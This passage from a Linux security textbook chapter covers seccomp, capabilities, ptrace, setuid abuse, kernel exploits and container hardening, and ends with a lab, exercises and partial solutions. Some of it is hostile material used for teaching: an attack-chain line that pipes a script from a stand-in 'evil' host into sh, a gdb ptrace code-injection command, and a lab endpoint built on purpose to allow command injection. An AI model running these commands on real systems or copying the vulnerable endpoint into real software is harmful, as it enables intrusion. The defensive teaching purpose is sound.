 18.03    0.080711          20      4008           read
 12.66    0.056673          14      4008           write
  9.81    0.043912          21      2004           accept4
  7.44    0.033301          16      2004           close
  4.12    0.018444          18      1002        12 futex
  ...
------ ----------- ----------- --------- --------- ----------------
100.00    0.447712                 15834        12 total
```

Now form the security judgement: this workload uses perhaps 25 distinct syscalls. A default
container profile allows ~300. **The gap between what your service needs and what it is
permitted is your unnecessary attack surface**, and you just measured it. That measurement
is exactly how you build a tight seccomp profile in §15.

### 8.2 Prove that seccomp is irreversible and inherited

```bash
$ cat > seccomp_demo.py <<'EOF'
import ctypes, os, sys
# pyseccomp / libseccomp binding is easier; using prctl directly for clarity
import seccomp   # pip install seccomp  (libseccomp-dev required)

f = seccomp.SyscallFilter(defaction=seccomp.ALLOW)
f.add_rule(seccomp.ERRNO(errno=1), "execve")     # EPERM on execve
f.load()
print("filter loaded; trying to exec /bin/ls ...")
try:
    os.execv("/bin/ls", ["ls"])
except PermissionError as e:
    print("blocked:", e)
print("and the filter cannot be removed by this process, ever.")
EOF
$ python3 seccomp_demo.py
filter loaded; trying to exec /bin/ls ...
blocked: [Errno 1] Operation not permitted
and the filter cannot be removed by this process, ever.
```

An attacker who achieves code execution *inside* this process cannot spawn a shell. They
can still do everything the process itself can do — read its memory, use its open sockets,
talk to its database. Note which half of the attack this control removes and which half it
does not; that is §9 of Chapter 1's discipline applied again.

### 8.3 See capability enforcement directly

```bash
$ ping -c1 8.8.8.8 > /dev/null && echo worked
worked
$ getcap $(which ping)
/usr/bin/ping cap_net_raw=ep

# Remove the capability and watch it fail:
$ sudo setcap -r $(which ping)
$ ping -c1 8.8.8.8
ping: socket: Operation not permitted
$ sudo setcap cap_net_raw+ep $(which ping)     # restore
```

`ping` needs to create a raw socket (`socket(AF_INET, SOCK_RAW, ...)`). Historically it was
setuid-root — full privilege for one narrow need. Now it holds exactly one capability. That
progression, from "all of root" to "one specific permission", is the same evolution you
will drive in AWS IAM when you replace `AdministratorAccess` with a scoped policy
(Chapter 73). The pattern is identical; only the vocabulary changes.

### 8.4 Watch a privilege drop happen

```bash
$ sudo bpftrace -e '
  tracepoint:syscalls:sys_enter_setuid  { printf("%-6d %-16s setuid(%d)\n",  pid, comm, args->uid); }
  tracepoint:syscalls:sys_enter_setgid  { printf("%-6d %-16s setgid(%d)\n",  pid, comm, args->gid); }
  tracepoint:syscalls:sys_enter_execve  { printf("%-6d %-16s execve(%s)\n",  pid, comm, str(args->filename)); }
' &
$ sudo systemctl restart nginx
```

You will see the `execve`, then the worker's `setgid`/`setuid` — the exact sequence from §7,
observed live rather than read about.

### 8.5 Break the user/kernel pointer boundary (and fail)

```bash
$ cat > badptr.c <<'EOF'
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
int main(void) {
    /* Ask the kernel to write into a KERNEL address on our behalf. */
    void *kernel_addr = (void *)0xffffffff81000000UL;
    ssize_t n = read(0, kernel_addr, 64);
    printf("read returned %zd, errno=%d (%s)\n", n, errno, strerror(errno));
    return 0;
}
EOF
$ gcc -o badptr badptr.c && echo hello | ./badptr
read returned -1, errno=14 (Bad address)
```

`EFAULT`. The kernel's `copy_to_user` validated the destination against the caller's address
space and refused. This is the mechanism referenced in §3 step 2. A kernel that got this
wrong — and several CVEs have — hands an unprivileged process an arbitrary kernel write,
which is a complete compromise.

---

## 9. Security Implications

### 9.1 The syscall interface is the host's attack surface

Every syscall is kernel code reachable from ring 3 by design. The kernel is ~30 million
lines of C. Therefore:

- **Reducing reachable syscalls reduces exploitable kernel code.** That is the entire
  security argument for seccomp, and it is a strong one: many kernel LPE exploits target
  syscalls (`unshare`, `userfaultfd`, `io_uring`, `bpf`, `ptrace`, `keyctl`, `msgsnd`) that
  a typical web service never calls.
- **Blocking a syscall is a stronger control than patching a specific CVE**, because it
  covers the bugs not yet discovered in that code path. Prefer it where feasible — this is
  the "eliminate a class rather than detect instances" principle from Chapter 1 §11.5
  applied to the kernel.

Concrete example worth remembering: several container escapes and LPEs in 2022–2023 were in
`io_uring`. Organizations that had blocked `io_uring` syscalls in their seccomp profiles —
usually for unrelated reasons — were unaffected. Google disabled io_uring across production
and ChromeOS for exactly this reason.

### 9.2 Credentials are the other half

Syscall filtering restricts *what you can ask*. Credentials restrict *what the answer will
be*. You need both:

| Control | Restricts | Bypassed by |
|---|---|---|
| seccomp | which syscalls | a permitted syscall that does the damage |
| capabilities | privileged operations within syscalls | a capability you left enabled |
| UID/GID + file modes | file and process access | the file being world-readable; root |
| LSM (AppArmor/SELinux) | resource-specific policy | policy gaps, permissive mode |
| namespaces | what is visible | an unnamespaced kernel interface (see §13) |

The most common real-world failure is not a clever bypass. It is **running as root with
default capabilities because nobody changed the default**, at which point four of the five
rows above are empty.

### 9.3 `ptrace` deserves its own paragraph

`ptrace` lets one process read and write another's memory and registers. It powers
debuggers and `strace`. It is also a complete bypass of process isolation for any process
running as the same user:

```bash
# As the 'ledger' user, against another 'ledger' process:
$ gdb -p 1842 -batch -ex 'call (int)system("id > /tmp/pwned")'
```

No kernel vulnerability required. Same UID is sufficient. This is why:

- `kernel.yama.ptrace_scope=1` (the default on Ubuntu) restricts `ptrace` to direct children;
  `2` restricts to root; `3` disables it entirely.
- Docker drops `CAP_SYS_PTRACE` by default.
- Services that handle secrets should run as **distinct users**, not all as `appuser`.

Point 3 is underappreciated. Running your API and your queue worker as the same UID means a
compromise of either can attach to the other and read its memory — including secrets the
compromised one never had.

---

## 10. Attack Scenarios

### 10.1 From RCE to shell: the `execve` moment

```
Attacker: exploits a deserialization bug in the API (Chapter 54)
  -> gains code execution inside the dotnet process, as user 'ledger'
  -> Runtime.getRuntime().exec / Process.Start / os.system
  -> execve("/bin/sh", ["-c", "curl http://evil/x.sh | sh"])
```

Three independent controls could stop this, and a serious platform has all three:

1. **seccomp denying `execve`** — the API never spawns processes, so denying it is free.
   Attack stops at the first step.
2. **A read-only root filesystem + no shell in the image** — distroless images have no
   `/bin/sh` to exec. `execve` succeeds syscall-wise but finds no file (`ENOENT`).
3. **Egress network policy** — the `curl` cannot reach `evil`.

Notice that none of these fix the deserialization bug. They contain it. That is the correct
way to think about defense in depth: **a vulnerability you have not found yet should still
fail to produce an incident.** Chapter 43 formalizes this.

### 10.2 Privilege escalation via setuid binary abuse

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/pkexec          <-- CVE-2021-4034 "PwnKit": trivial root for any local user
/usr/local/bin/backup    <-- custom; written by a developer; almost certainly exploitable
```

The last line is the realistic one. A well-meaning engineer makes a maintenance script
setuid-root so the ops team can run it. Now it runs as root with an attacker-controllable
environment: `PATH`, `LD_PRELOAD` (blocked for setuid, but `PATH` is not), `IFS`, argument
injection, or a relative-path command inside the script. That is a local root shell.

Enumerating setuid binaries is one of the first things any attacker does after landing on a
host, and it should be one of the first things your hardening baseline audits (Chapter 44).

### 10.3 Kernel exploits: Dirty COW and Dirty Pipe

Both are perfect illustrations of Chapter 1's mechanisms failing, which is why they are
worth knowing by name:

- **Dirty COW (CVE-2016-5195)** — a race in the copy-on-write handler. By racing
  `madvise(MADV_DONTNEED)` against a write through `/proc/self/mem`, an unprivileged
  process could write to a *read-only, private* file mapping, and the write reached the
  underlying page cache. Result: modify `/etc/passwd` as any user. The COW mechanism from
  Chapter 1 §5.2 did exactly what it was designed to do, in the wrong order.
- **Dirty Pipe (CVE-2022-0847)** — an uninitialized flag in the pipe buffer structure let a
  process splice into the page cache of a read-only file. Same outcome: overwrite any file
  the attacker can read. Ten lines of exploit code, no race needed, worked in containers.

Both broke containers too, because **containers share the kernel**. Both were fixed by
kernel patches — nothing a container runtime could do. This is the single most important
practical argument for the isolation ladder (Chapter 1 §5.4): if your threat model includes
kernel LPE, containers are not sufficient isolation, and you need VMs or microVMs.

### 10.4 Evading syscall-based detection

Because detection tools watch syscalls, attackers work to avoid distinctive ones:

| Evasion | Mechanism | Counter |
|---|---|---|
| Avoid `execve` | do everything in-process (memory-only payloads, reflective loading) | monitor `mprotect(PROT_EXEC)`, unusual network egress, `memfd_create` |
| `memfd_create` + `execveat` | run a binary that never touches disk | alert on `memfd_create` followed by `execveat`; it is rare and high-signal |
| `io_uring` | submit file and network operations through a ring buffer instead of syscalls — **classic syscall tracing misses them** | block `io_uring_setup` in seccomp; use eBPF probes at the VFS/LSM layer instead of the syscall tracepoint |
| Direct syscall invocation | bypass libc hooks (defeats `ltrace`/LD_PRELOAD-based tools) | kernel-side tracing (eBPF/audit) is unaffected |

The `io_uring` row is the important one for a cloud security engineer in the 2020s, and it
is a genuinely current gap: a tool that instruments only `sys_enter_*` tracepoints can be
blind to a process reading files and opening network connections through io_uring. When
evaluating a runtime-security product, "do you cover io_uring?" is a question that quickly
separates serious vendors from the rest.

---

## 11. Defensive Techniques

Concretely, for a service you own. In rough order of value per unit of effort:

**1. Do not run as root.**

```ini
# /etc/systemd/system/ledger-api.service
[Service]
User=ledger
Group=ledger
```

```dockerfile
# Dockerfile
RUN adduser --system --uid 10001 --no-create-home appuser
USER 10001
```

```yaml
# Kubernetes
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
```

**2. Foreclose privilege gain.**

```ini
NoNewPrivileges=yes           # systemd
```
```bash
--security-opt no-new-privileges   # docker
```
```yaml
allowPrivilegeEscalation: false    # kubernetes
```

**3. Drop all capabilities, add back only what is needed.**

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: []          # a typical web service needs NONE
```

If you think you need `CAP_NET_BIND_SERVICE`, you probably want to listen on 8080 and let
the load balancer or Service handle port 443 instead. Needing zero capabilities is the
normal case and should be the default assumption.

**4. Apply a seccomp profile.**

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault     # the minimum acceptable; Localhost/<custom> is better
```

`RuntimeDefault` is not automatic in Kubernetes unless you enable it — and "no seccomp
profile at all" is a very common finding in real clusters. Chapter 105 enforces it with
admission policy.

**5. Lock down systemd units.** systemd is an underused sandboxing engine:

```ini
[Service]
User=ledger
NoNewPrivileges=yes
ProtectSystem=strict          # / is read-only
ProtectHome=yes               # /home, /root, /run/user inaccessible
PrivateTmp=yes                # private /tmp namespace
PrivateDevices=yes            # minimal /dev, no raw device access
ProtectKernelTunables=yes     # /proc/sys, /sys read-only
ProtectKernelModules=yes      # module loading blocked
ProtectControlGroups=yes
RestrictSUIDSGID=yes          # cannot create setuid files
RestrictNamespaces=yes        # cannot create namespaces (blocks user-ns escape tricks)
RestrictRealtime=yes
MemoryDenyWriteExecute=yes    # W^X enforced (NOTE: breaks JIT — see below)
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources @module @debug @mount @obsolete
SystemCallArchitectures=native
LockPersonality=yes
CapabilityBoundingSet=
ReadWritePaths=/var/lib/ledger /var/log/ledger
```

Score your unit files with `systemd-analyze security ledger-api.service`, which prints a
0–10 exposure rating and names each missing directive. It is the fastest hardening win
available on a Linux host, and it requires no new tooling.

One caveat, because it will bite you: `MemoryDenyWriteExecute=yes` blocks the RWX mappings
that .NET's and Node's JITs need. For .NET you can run with
`DOTNET_TieredCompilation=0` and ReadyToRun/AOT publishing, or simply omit this directive
for JIT workloads. Knowing *why* it breaks — Chapter 1 §11.1 — is what lets you make that
call quickly instead of cargo-culting.

**6. Restrict `ptrace` and separate service users.**

```bash
$ echo 'kernel.yama.ptrace_scope = 1' | sudo tee /etc/sysctl.d/10-ptrace.conf
$ sudo sysctl --system
```

---

## 12. Production Architecture

How these primitives compose in a real deployment:

```
+--------------------------------------------------------------------------+
|  EC2 / EKS node — one Linux kernel                                        |
|                                                                           |
|  +-------------------------+     +-------------------------+              |
|  |  Pod: ledger-api        |     |  Pod: ledger-worker     |              |
|  |  uid 10001, no caps     |     |  uid 10002, no caps     |              |
|  |  seccomp: RuntimeDefault|     |  seccomp: custom        |              |
|  |  readOnlyRootFilesystem |     |  readOnlyRootFilesystem |              |
|  |  no shell in image      |     |  no shell in image      |              |
|  +-------------------------+     +-------------------------+              |
|              |                              |                             |
|              +-------------+----------------+                             |
|                            v                                              |
|                  SHARED KERNEL  <-- the boundary that matters             |
|                            |                                              |
|              +-------------+----------------+                             |
|              |                              |                             |
|        seccomp filters              LSM (AppArmor/SELinux)                |
|        capability bounding sets     namespaces + cgroups                  |
|              |                                                            |
|        eBPF probes (Falco / Tetragon) observing syscalls -> SIEM          |
+--------------------------------------------------------------------------+
```

The design logic, which you should be able to recite in a review:

1. Each workload gets a **distinct UID** so `ptrace` and file permissions separate them.
2. Each gets **zero capabilities** unless proven otherwise.
3. Each gets a **seccomp profile** sized from measured behavior (§8.1).
4. The **shared kernel is the residual risk.** It is mitigated by patching, by minimizing
   reachable syscalls, and — where the threat model demands it — by moving to microVM
   isolation (Firecracker, Kata Containers, EKS on Fargate, which gives each pod its own
   microVM).
5. **Detection** assumes all of the above can fail, and watches the syscall layer.

Point 4 is the decision most often made badly, and it is a *judgment* call, not a
configuration one: multi-tenant untrusted code → microVMs; your own microservices with
tenant data separated in the application → hardened containers are usually proportionate.
Say which one you are choosing and why, in writing, in the design doc.

---

## 13. Common Mistakes

1. **Running containers as root "temporarily."** It is never temporary. Set `USER` in the
   Dockerfile from the first commit; retrofitting it later means fixing file ownership
   across volumes under time pressure.
2. **Adding `CAP_SYS_ADMIN` to make something work.** It is often described as "the new
   root" — it grants mount, namespace manipulation, and dozens of other operations, and it
   is a direct container-escape enabler. If something needs it, redesign.
3. **Writing a seccomp deny-list.** Attackers use the syscall you did not think of. Build
   allow-lists from `SECCOMP_RET_LOG` observation.
4. **Forgetting the architecture check in a custom filter.** §5.4. Bypassable via the
   32-bit interface.
5. **Assuming namespaces hide everything.** They do not: `/sys` is only partly namespaced,
   the kernel log (`dmesg`), the kernel version, `/proc/sys` (when writable), and many
   sysctls leak host information or provide escape paths. Chapter 96 enumerates these.
6. **Running all services as one shared `app` user.** Same-UID processes can `ptrace` one
   another. Separate UIDs cost nothing.
7. **Instrumenting only syscall tracepoints and calling it runtime security.** io_uring and
   in-process execution evade it.
8. **Ignoring zombie processes in containers.** Application-as-PID-1 does not reap; use
   `--init`/`tini`, or handle `SIGCHLD`.
9. **Treating `strace` output as a performance profile.** It is 10–100× slower; use
   `perf trace` or eBPF for anything performance-sensitive.
10. **Leaving `MemoryDenyWriteExecute=yes` off because "it broke once".** Understand *why*
    it broke (JIT) and decide deliberately; do not silently drop hardening because of one
    failed attempt.

---

## 14. Troubleshooting

| Symptom | Likely cause | Diagnostic |
|---|---|---|
| Container exits immediately, no logs | Binary missing, wrong arch, or blocked syscall at startup | `strace -f -e trace=execve` on the entrypoint; check `dmesg` for `seccomp` kill messages |
| `Operation not permitted` on an operation that works as root | Missing capability | `grep Cap /proc/PID/status`; decode with `capsh --decode=<hex>` |
| Process cannot be killed with `kill -9` | D state, blocked in uninterruptible I/O | `cat /proc/PID/stack`, `cat /proc/PID/wchan`; investigate storage/network FS |
| Works locally, `EACCES` in production | File ownership vs container UID | `ls -ln` on the mount; compare with `USER` in the image |
| `strace` shows nothing but the app is busy | Tracing the wrong thread, or io_uring | add `-f`; check `ls /proc/PID/task`; look for `io_uring_enter` |
| Sudden `SIGSYS` kills | seccomp filter denying a syscall | `dmesg \| grep -i seccomp` prints the syscall number; `ausearch -m SECCOMP` |
| PID exhaustion | zombies or a fork bomb | `ps -eo stat \| grep -c Z`; `cat /proc/sys/kernel/pid_max`; set `pids` cgroup limit |
| Cannot install seccomp filter as non-root | `no_new_privs` not set first | it is a hard kernel requirement; call `prctl(PR_SET_NO_NEW_PRIVS, 1)` |

**Decoding a capability mask** — a genuinely useful trick:

```bash
$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,
cap_mknod,cap_audit_write,cap_setfcap
```

That is Docker's default set. Ask of each entry: does my web service need it? The answer is
no, for all fourteen.

---

## 15. Practical Lab

### LAB 2.1 — Build a Minimal Seccomp Profile From Measured Behavior

**Objective.** Take a real ASP.NET Core service, measure the syscalls it actually uses,
generate a least-privilege seccomp profile, verify it works, and then prove it blocks a
realistic post-exploitation action.

**Cost.** Free. **Environment.** ENV-1 + ENV-2 (Linux + Docker). **Time.** 60–90 minutes.

**Prerequisites.**

```bash
sudo apt-get install -y strace jq docker.io libseccomp-dev
docker --version && strace --version
```

**Architecture.**

```
  [ curl load ] --> [ container: ledger-api ] --> strace -c --> syscall census
                              |                                      |
                              |                      generate allow-list JSON
                              v                                      |
                    re-run with --security-opt seccomp=profile.json <+
                              |
                    attempt post-exploitation (exec a shell) -> BLOCKED
```

**Steps.**

*Step 1 — A minimal but realistic service.*

```bash
mkdir -p ~/lab02 && cd ~/lab02
dotnet new web -o LedgerApi
cd LedgerApi
cat > Program.cs <<'EOF'
var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();
app.MapGet("/health", () => Results.Ok(new { status = "ok" }));
app.MapGet("/read", () => Results.Text(File.ReadAllText("/etc/hostname")));
// Deliberately present, to demonstrate what seccomp prevents later:
app.MapGet("/exec", (string cmd) => {
    // ===== INTENTIONALLY VULNERABLE EXAMPLE =====
    // Command injection (Chapter 53). Present ONLY to demonstrate containment.
    var p = System.Diagnostics.Process.Start("/bin/sh", $"-c \"{cmd}\"");
    p!.WaitForExit();
    return Results.Ok(new { exit = p.ExitCode });
});
app.Run("http://0.0.0.0:8080");
EOF
cat > Dockerfile <<'EOF'
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY . .
RUN dotnet publish -c Release -o /app
FROM mcr.microsoft.com/dotnet/aspnet:8.0
RUN adduser --system --uid 10001 --no-create-home appuser
WORKDIR /app
COPY --from=build /app .
USER 10001
ENTRYPOINT ["dotnet", "LedgerApi.dll"]
EOF
docker build -t ledger-api:lab .
```

*Step 2 — Measure the syscall census under load.*

```bash
docker run -d --name ledger --cap-add SYS_PTRACE -p 8080:8080 ledger-api:lab
sleep 5
PID=$(docker inspect -f '{{.State.Pid}}' ledger)
sudo strace -f -c -p $PID -o /tmp/census.txt &
for i in $(seq 1 100); do
  curl -s localhost:8080/health > /dev/null
  curl -s localhost:8080/read   > /dev/null
done
sleep 2; sudo pkill strace; sleep 1
awk 'NR>2 && $NF !~ /total|-----/ {print $NF}' /tmp/census.txt | sort -u | tee /tmp/used.txt
```

**Expected output:** roughly 30–45 distinct syscall names.

*Step 3 — Generate the profile.*

```bash
python3 - <<'PY'
import json
names = sorted({l.strip() for l in open('/tmp/used.txt') if l.strip()})
# Startup syscalls that strace may miss because we attached after launch:
names += ["execve","exit_group","arch_prctl","set_tid_address","set_robust_list",
          "prlimit64","readlink","getrandom","rseq","clone3","sigaltstack",
          "membarrier","mlock","sched_getaffinity","gettid","newfstatat","statx"]
profile = {
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64","SCMP_ARCH_X86","SCMP_ARCH_X32"],
  "syscalls": [{"names": sorted(set(names)), "action": "SCMP_ACT_ALLOW"}]
}
json.dump(profile, open('/tmp/ledger-seccomp.json','w'), indent=2)
print("allowed syscalls:", len(profile["syscalls"][0]["names"]))
PY
```

*Step 4 — Run under the profile and verify the service still works.*

```bash
docker rm -f ledger
docker run -d --name ledger \
  --security-opt seccomp=/tmp/ledger-seccomp.json \
  --security-opt no-new-privileges \
  --cap-drop ALL \
  --read-only --tmpfs /tmp \
  -p 8080:8080 ledger-api:lab
sleep 5
curl -s localhost:8080/health ; echo
curl -s localhost:8080/read ; echo
```

**Expected output:** `{"status":"ok"}` and the hostname. If the container fails to start,
read `dmesg | grep -i seccomp` — it names the blocked syscall number; decode it with
`ausyscall <number>` or `grep <number> /usr/include/asm/unistd_64.h`, add it, retry. That
iteration loop *is* the exercise.

*Step 5 — Attempt post-exploitation.*

```bash
curl -s "localhost:8080/exec?cmd=id"
docker logs ledger --tail 20
dmesg | tail -5
```

**Expected:** the command-injection endpoint fails, because `execve` of `/bin/sh` is not in
the allow-list (the service never spawned a process during measurement, so `execve` after
startup is absent). Compare with the unfiltered run:

```bash
docker rm -f ledger
docker run -d --name ledger-open -p 8081:8080 ledger-api:lab
sleep 5
curl -s "localhost:8081/exec?cmd=id"     # succeeds — the vulnerability is exploitable
```

**Security implications.** Write down: (a) the vulnerability was identical in both runs;
(b) only the *consequence* changed; (c) which specific syscall boundary produced that
difference; (d) what the attacker can still do in the filtered container (answer: everything
the process itself can do — read its config, use its DB connection, exfiltrate over its
existing socket). Containment is not remediation.

**Attack scenario.** Now think like the attacker: with `execve` blocked, how would you
persist or move laterally without spawning a process? (In-process HTTP client to the
metadata service; reading the ServiceAccount token from the filesystem; using the existing
database connection.) List which *additional* controls stop each of those — this is the
transition from a single control to a defense-in-depth posture.

**Hardening checklist applied here.** Non-root UID, `--cap-drop ALL`, `no-new-privileges`,
read-only root filesystem, custom seccomp, no shell needed in the image (next step: switch
the runtime stage to `mcr.microsoft.com/dotnet/runtime-deps:8.0-jammy-chiseled` and see
whether anything breaks).

**Verification.**

```bash
docker inspect ledger --format '{{json .HostConfig.SecurityOpt}}{{json .HostConfig.CapDrop}}{{.HostConfig.ReadonlyRootfs}}'
PID=$(docker inspect -f '{{.State.Pid}}' ledger)
sudo grep -E 'Seccomp|CapEff|NoNewPrivs|Uid' /proc/$PID/status
# expect: Seccomp: 2, CapEff: 0000000000000000, NoNewPrivs: 1, Uid: 10001
```

**Cleanup.**

```bash
docker rm -f ledger ledger-open 2>/dev/null
docker rmi ledger-api:lab
rm -rf ~/lab02 /tmp/census.txt /tmp/used.txt /tmp/ledger-seccomp.json
```

---

## 16. Exercises

### Concept questions

**2.1** Explain why seccomp cannot reliably filter `open()` by filename, and name the kernel
mechanism that *can*. Then state the general principle this illustrates and give one
non-Linux example of the same principle from later in this book.

**2.2** A process has `Uid: 1000 0 0 0` in `/proc/PID/status`. What happened, what can this
process do, and what is the significance of the last three values being 0?

**2.3** Why does `setuid(unprivileged_uid)` called by a root process irreversibly drop
privilege, while the same call by a non-root process with a saved UID does not? What breaks
if you call `setuid()` before `setgid()`?

**2.4** Your team wants to add `CAP_SYS_ADMIN` to a container so it can mount a FUSE
filesystem. Explain the risk concretely, and propose two alternatives.

**2.5** Explain why `execve` destroys the calling process's address space, and give one
security benefit and one forensic drawback of that behavior.

### Debugging problems

**2.6** A container runs fine with `docker run` but crashes instantly in Kubernetes with no
application logs. Exit code is 139. Walk through your diagnosis in order, and name the three
most likely causes.

**2.7** A .NET service works as root but fails as UID 10001 with an unhelpful
`UnauthorizedAccessException`. You cannot reproduce locally. What single command gives you
the answer, and what exactly are you looking for in its output?

**2.8** After adding a seccomp profile, your service starts fine but fails the first time it
handles a file upload, with no exception logged — the process simply dies. Explain what is
happening, how you would confirm it, and why no exception was logged.

### Security scenarios

**2.9** You discover that all six of your microservices run as UID 1000 on the same
Kubernetes nodes, with `automountServiceAccountToken: true` and no seccomp profile. Rank
the three changes you would make first, with justification based on what each actually
prevents.

**2.10** An incident responder tells you an attacker "got a shell" on an API pod. Using only
this chapter, list the evidence you would look for to determine (a) how they executed code,
(b) what they did next, and (c) whether they escaped the container.

### Architecture questions

**2.11** Design the syscall-level containment strategy for a platform that runs both
first-party microservices and third-party plugins. Specify what differs between the two and
why, and what you would monitor for each.

**2.12** Your organization wants runtime security monitoring across 400 nodes. Compare
auditd, eBPF-based tooling, and `SECCOMP_RET_USER_NOTIF` as implementation strategies on:
coverage, overhead, evasion resistance, and operational burden. Recommend one and state the
conditions under which you would change your mind.

### Hands-on exercises

**2.13** Use `bpftrace` to print every `execve` on your machine for five minutes, then
identify which of them are triggered by cron, by systemd timers, and by your shell.
Construct a detection rule that would fire only on an unexpected one.

**2.14** Harden a systemd unit for a Node.js or .NET service until
`systemd-analyze security` reports below 3.0. Document each directive you added and one
thing it would prevent.

**2.15** Write a program that opens a file, drops privileges with `setuid`, and then still
successfully reads from the already-open descriptor. Explain the result in terms of §4.5.

### Interview questions

**2.16** "Walk me through everything that happens when a process calls `write()`, from the
CPU instruction to the return value."

**2.17** "What is the difference between a process and a thread in Linux? Answer at the
kernel-structure level, then tell me the security consequence."

**2.18** "Why isn't a container a security boundary in the same way a VM is? Be specific."

**2.19** "We run everything as root in containers because it's easier. Convince me otherwise
— and tell me what could go wrong in the migration."

**2.20** "How would you detect a reverse shell on a Kubernetes node, and how would an
attacker try to avoid your detection?"

---

## 17. Summary

- Every interaction between a process and the world is a **system call**. ~350 of them are
  the complete vocabulary of a process, and therefore the complete attack surface of the
  kernel from userspace.
- The `syscall` instruction saves state, switches to ring 0, and dispatches through the
  syscall table; **seccomp runs before dispatch**, seeing register values but not
  dereferenceable pointers — which is why it filters *requests*, not *resources*.
- A process is a `task_struct`. A thread is also a `task_struct`, sharing `mm`, `files`, and
  `cred`. **Containers are `clone()` with namespace flags** plus cgroups, capabilities, and
  seccomp — not a distinct kernel object.
- **Credentials** (real/effective/saved UID, groups, capability sets) are the operating
  system's IAM, evaluated on every privileged operation. `execve` is the only place
  privilege can be *gained*, which is why `no_new_privs` matters.
- **File descriptors are capabilities**: authorization happens at `open`, not at each use,
  and they survive privilege drops and (without `O_CLOEXEC`) `execve`.
- Nginx demonstrates the canonical pattern: do privileged work first, keep the fds, drop
  privileges irreversibly, then handle untrusted input unprivileged.
- The practical containment stack is five orthogonal dimensions: **UID, capabilities,
  seccomp, namespaces, cgroups**. Most real-world failures are defaults left unchanged, not
  clever bypasses.
- `ptrace` defeats process isolation for same-UID processes — run services as distinct users.
- The **shared kernel is the residual risk** of containers (Dirty COW, Dirty Pipe). If your
  threat model includes kernel LPE, you need microVMs.
- Detection lives at the syscall layer (eBPF, auditd), and attackers evade it with
  in-process execution, `memfd_create`, and **io_uring** — which classic syscall tracing
  misses entirely.

---

## 18. Knowledge Check

1. Which register holds the syscall number on x86-64, and which holds argument 4? Why not `RCX`? (§4.3)
2. Name the six `clone()` flags that turn a process into a thread. (§4.1)
3. What are the four values on the `Uid:` line of `/proc/PID/status`? (§4.2)
4. At which single point in a process's life can it gain privilege, and which flag forecloses that? (§5.1)
5. Why must a seccomp filter check the `arch` field? (§5.4)
6. What does `CapBnd` mean, and why can it only shrink? (§4.2, §5.1)
7. Why does the nginx worker still serve on port 80 after calling `setuid(33)`? (§4.5, §7)
8. What is the difference between `SECCOMP_RET_ERRNO` and `SECCOMP_RET_KILL_PROCESS` operationally? (§5.4)
9. Name two ways an attacker avoids `execve`-based detection. (§10.4)
10. Why did Dirty Pipe affect containers, and what class of isolation would have prevented it? (§10.3)

---

## 19. Further Exploration

- `man 2 syscalls` — the complete list. Skim it once; you will recognize names for years.
- `man 7 capabilities` — read it properly. It is the single densest security document in the
  Linux man pages, and Chapter 33 assumes it.
- `man 2 seccomp`, and the kernel docs at `Documentation/userspace-api/seccomp_filter.rst`.
- **Docker's default seccomp profile**: `moby/profiles/seccomp/default.json` in the moby
  repository. Read the whole thing once — it is an education in what "safe enough for
  arbitrary workloads" looks like.
- `systemd-analyze security` on every unit on a box you own. Then fix the worst one.
- **bcc/bpftrace tools**: `execsnoop`, `opensnoop`, `tcpconnect`, `capable`, `killsnoop`.
  The `capable` tool is especially illuminating: it prints every capability check the kernel
  performs, which tells you exactly which capabilities a workload truly needs.
- **"Understanding the Linux Kernel"** (Bovet & Cesati) for depth, or the kernel source at
  `arch/x86/entry/entry_64.S` if you want to read the actual entry path.

---

## Solutions

### 2.1
seccomp evaluates a BPF program against `struct seccomp_data`, which contains the raw
register values. The filename argument to `open()` is a *pointer* into userspace memory.
seccomp cannot dereference it (it runs in a restricted BPF context, and even if it could,
userspace could modify the memory between the check and the kernel's own copy — a TOCTOU
race). So seccomp can only filter on the syscall number and non-pointer scalar arguments.
Path-based policy requires an LSM — AppArmor, SELinux, or Landlock — which hooks inside the
kernel *after* path resolution, where the decision is made against the resolved object
rather than an attacker-mutable pointer. The general principle: **filter on the request, or
enforce at the resource; only the latter is race-free.** Later examples: security groups
filter packets by header while S3 bucket policies enforce at the object (Ch. 76 vs 79); a
WAF matches request text while application authorization enforces on the row (Ch. 85 vs 51);
Kubernetes admission validates the manifest while RBAC enforces on the API object (Ch. 105
vs 101).

### 2.2
Real UID 1000, effective/saved/fs UID 0 — the process was launched by user 1000 and executed
a **setuid-root binary** (or gained root another way and retains the ability to return to
it). It can do anything root can do, because permission checks use the effective UID. The
saved UID being 0 is the critical detail: the process can drop to 1000 and *regain* root
with `seteuid(0)`, so a compromise at any point during its life is a root compromise. Truly
dropping privilege requires `setresuid(1000,1000,1000)` (or `setuid()` while euid is 0,
which sets all three).

### 2.3
When a process with euid 0 calls `setuid(n)`, the kernel sets *all* of real, effective and
saved UID to `n`. With the saved UID gone, there is no stored value to return to, so the
drop is permanent. A non-root process calling `setuid()` may only switch among its existing
real/effective/saved values, so it can go back. If you call `setuid()` before `setgid()`,
you lose root before performing the group change, and `setgid()` then fails (silently, if
you do not check the return value) — leaving the process running with the original, usually
privileged, group. This is a real and recurring bug; always `setgroups()`, then `setgid()`,
then `setuid()`, and check every return value.

### 2.4
`CAP_SYS_ADMIN` grants mount/umount, `pivot_root`, namespace operations, `setns`, BPF in
some configurations, and many device operations — it is widely described as equivalent to
root, and it is a direct escape enabler: with mount capability inside a container you can
often manipulate cgroups or the host filesystem to execute code on the host. Alternatives:
(1) mount the filesystem on the *host* (or as a CSI driver) and pass it into the container
as a volume, so the container needs no capability at all; (2) use a dedicated privileged
sidecar or DaemonSet with the capability, exposing a narrow interface to the unprivileged
workload — the Nginx master/worker pattern from §7 generalized; (3) if FUSE specifically is
required, evaluate whether the workload belongs in a microVM instead.

### 2.5
